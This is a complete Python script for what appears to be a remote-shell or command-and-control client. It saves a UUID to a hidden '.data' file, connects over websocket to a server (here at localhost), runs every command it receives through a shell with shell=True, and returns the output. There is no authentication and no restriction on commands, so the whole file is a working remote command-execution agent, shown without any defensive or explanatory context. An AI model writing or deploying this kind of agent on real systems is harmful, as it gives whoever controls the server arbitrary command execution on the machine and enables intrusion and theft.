from pathlib import Path
import subprocess
import websockets
import asyncio
import uuid
import os

# --- Subprocessing ---
def exe_cmd(cmd) -> str:
    out = subprocess.run(cmd, capture_output=True, text=True, shell=True)
    if not out.returncode == 0:
        return f"ERROR: {out.stderr}"
    else:
        return out.stdout



# --- storing UUID ---
uuid_file = Path(os.path.join(os.getcwd(), "./.data"))
if uuid_file.is_file():
    with open(".data", 'r') as f:
        my_uuid = f.read()
        print(f"your UUID: {my_uuid}")
        
else:
    with open(".data", 'w') as f:
        my_uuid = str(uuid.uuid4())
        f.write(my_uuid)
        print(f"your UUID: {my_uuid}")



# --- Socket  Connection ---
async def hello():

    URL = f"ws://127.0.0.1:8000/ws/{my_uuid}/"

    async with websockets.connect(URL) as websocket:
        await websocket.send('Connected !')
        
        while True:
            cmd = await websocket.recv()
            print(cmd)
            cmd_out = exe_cmd(cmd)
            print(cmd_out)
            await websocket.send(f'[[;lime;]{cmd_out}]')


if __name__ == "__main__":
    asyncio.run(hello())



